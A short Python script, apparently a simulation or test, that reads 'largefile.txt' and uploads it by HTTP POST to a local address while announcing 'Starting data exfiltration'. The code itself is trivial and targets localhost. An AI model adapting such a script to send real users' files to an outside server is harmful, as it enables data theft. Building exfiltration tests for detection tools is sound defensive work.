import requests
from datetime import datetime

URL = "http://127.0.0.1:8000"

print(f"[{datetime.now()}] Starting data exfiltration...")

try:
    with open("largefile.txt", "rb") as f:
        response = requests.post(URL, data=f)
        print("Upload attempted. Status:", response.status_code)
except Exception as e:
    print("Error:", e)